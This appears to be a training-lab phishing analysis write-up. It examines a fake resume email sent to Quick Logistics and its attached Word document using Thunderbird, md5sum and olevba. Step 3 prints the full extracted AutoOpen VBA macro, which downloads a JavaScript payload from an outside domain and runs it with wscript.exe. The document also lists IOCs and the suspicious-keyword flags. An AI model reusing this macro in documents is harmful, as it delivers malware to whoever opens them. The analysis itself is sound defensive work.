# Phase 1 — Phishing Email & Document Analysis

**Analyst:** Andy Dela Quarshie Wright  
**Tools:** Thunderbird (mbox import), olevba, oletools  
**Files:** Resume - Application for Junior IT Analyst Role.eml, Resume_WesleyTaylor.doc  

---

## Step 1 — Email Analysis

**Objective:** Identify sender, recipient, subject, and attachment details.

**Tool:** Thunderbird — Import Data → Berkeley Mailbox (mbox)

**Email headers:**
```
From:    westaylor23@outlook.com
To:      maxine.beck@quicklogisticsorg.onmicrosoft.com
Subject: Resume - Application for Junior IT Analyst Role
Date:    Sun, 20 Aug 2023 18:19:20 +0000
```

**Email body:** Attacker posed as Wesley Taylor, a recent Computer Science graduate applying for a Junior IT Analyst role at Quick Logistics LLC. The email was professionally written to appear legitimate and avoid suspicion.

**Attachment:** Resume_WesleyTaylor.doc (Microsoft Word Document)

**Screenshot:** 01_phishing_email.png

---

## Step 2 — Hash the Attachment

**Objective:** Generate MD5 hash of the malicious document for threat intelligence lookup.

**Command:**
```bash
md5sum Resume_WesleyTaylor.doc
```

**Result:**
```
52c4384a0b9e248b95804352ebec6c5b  Resume_WesleyTaylor.doc
```

**Screenshot:** 05_md5_hash_artefacts.png

---

## Step 3 — VBA Macro Analysis with olevba

**Objective:** Extract and analyse the VBA macro embedded in the Word document.

**Command:**
```bash
olevba Resume_WesleyTaylor.doc
```

**Macro identified:** `NewMacros.bas` — AutoOpen trigger

**Macro code extracted:**
```vba
Sub AutoOpen()
    spath = "C:\ProgramData\"
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
    xHttp.Send
    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile spath & "\update.js", 2
    End With
    Set shell_object = CreateObject("WScript.Shell")
    shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
End Sub
```

**What this macro does:**
1. Runs automatically when the document is opened (AutoOpen)
2. Creates an HTTP object to download a file
3. Downloads `update.png` from `boogeymanisback.lol` — disguised as an image but is actually a JavaScript payload
4. Saves it as `C:\ProgramData\update.js`
5. Executes it using `wscript.exe`

**Screenshot:** 02_olevba_macro_analysis.png

---

## Step 4 — Suspicious Keyword Analysis with oletools

**Objective:** Identify all suspicious VBA keywords flagged by oletools.

**Command:**
```bash
olevba --reveal Resume_WesleyTaylor.doc
```

**Suspicious keywords flagged:**

| Type | Keyword | Description |
|------|---------|-------------|
| AutoExec | AutoOpen | Runs when the Word document is opened |
| Suspicious | Open | May open a file |
| Suspicious | write | May write to a file |
| Suspicious | Adodb.Stream | May create a text file |
| Suspicious | savetofile | May create a text file |
| Suspicious | Shell | May run an executable |
| Suspicious | WScript.Shell | May run an executable or system command |
| Suspicious | CreateObject | May create an OLE object |
| Suspicious | Microsoft.XMLHTTP | May download files from the Internet |
| Suspicious | Exec | May run an executable |
| Suspicious | Hex Strings | Hex-encoded strings detected — possible obfuscation |
| IOC | https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png | Malicious URL |

**Screenshot:** 03_oletools_suspicious_keywords.png
